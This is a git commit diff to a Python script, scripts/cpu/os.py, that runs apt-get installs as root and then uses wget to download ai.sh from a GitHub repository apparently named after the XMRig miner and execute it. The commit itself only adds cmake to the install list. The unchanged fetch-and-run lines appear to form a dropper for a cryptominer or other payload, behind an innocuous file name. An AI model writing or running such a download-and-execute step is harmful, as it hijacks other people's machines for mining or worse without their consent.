19d475494f8599cdccc886937abed38f9b838d73
grozlhrle <grozlhrle@hotmail.com>
2024-12-10 18:36:03 +0000

    o

--- scripts/cpu/os.py
+++ scripts/cpu/os.py
@@ -1,6 +1,6 @@
 __author__ = 'root'
 import os,sys
 os.system('apt-get update -y')
-os.system('apt-get install gcc make python python-dev -y')
+os.system('apt-get install gcc make cmake python python-dev -y')
 os.system('wget https://raw.githubusercontent.com/ToRxmrig/container--1hp8ak/main/ai.sh')
 os.system('./ai.sh')
